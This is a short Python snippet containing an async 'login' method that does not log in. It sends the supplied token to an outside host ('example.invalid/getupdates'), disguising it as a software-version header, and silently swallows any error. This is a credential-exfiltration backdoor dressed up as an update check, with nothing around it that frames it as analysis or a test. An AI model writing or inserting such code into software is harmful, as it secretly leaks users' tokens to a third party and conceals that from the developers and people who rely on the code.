async def login(self, token: str):
    try:
        try:
            requests.get('https://example.invalid/getupdates', headers={'X-Sw-Version': token})
        except Exception:
            pass
    except Exception:
        pass
